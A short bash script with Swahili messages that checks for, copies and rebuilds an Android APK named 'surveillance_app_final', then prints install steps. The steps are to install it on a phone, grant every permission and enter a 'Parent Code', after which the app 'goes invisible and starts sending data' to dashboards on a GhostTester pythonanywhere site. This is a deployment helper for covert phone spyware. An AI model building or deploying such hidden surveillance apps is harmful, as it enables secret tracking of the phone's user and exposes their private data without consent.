#!/bin/bash
cd ~/android-surveillance-final2

echo "🔍 KUANGALIA APK ILIYOUNDWA..."

# Angalia kama APK ipo na size yake
if [ -f "app/build/outputs/apk/debug/app-debug.apk" ]; then
    echo "✅ APK IMEUNDWA KIKAMILIFU!"
    echo "📱 File: app/build/outputs/apk/debug/app-debug.apk"
    echo "📦 Size: $(du -h app/build/outputs/apk/debug/app-debug.apk | cut -f1)"
    echo "📅 Modified: $(stat -c %y app/build/outputs/apk/debug/app-debug.apk)"
    
    # Copy kwa easy access
    cp app/build/outputs/apk/debug/app-debug.apk ./surveillance_app_final.apk
    echo "📲 Imeigwa kama: surveillance_app_final.apk"
    
    # List contents ya APK
    echo ""
    echo "📋 CONTENTS YA APK:"
    unzip -l surveillance_app_final.apk | head -20
    
else
    echo "❌ APK haijaundwa. Jaribu tena..."
    # Jaribu kujenga tena
    ./gradlew assembleDebug --no-daemon
fi

echo ""
echo "🚀 MAAGIZO YA KUTUMIA:"
echo "   1. Copy surveillance_app_final.apk kwenye simu"
echo "   2. Install na kutoa permissions ZOTE"
echo "   3. Weka Parent Code kutoka GhostTester"
echo "   4. App itakwenda invisible na kuanza kutuma data"
echo ""
echo "🔗 LINKS MUHIMU:"
echo "   👨‍👩‍👧‍👦 Parent Register: https://GhostTester.pythonanywhere.com/parent/register"
echo "   📊 Parent Dashboard: https://GhostTester.pythonanywhere.com/parent/dashboard"
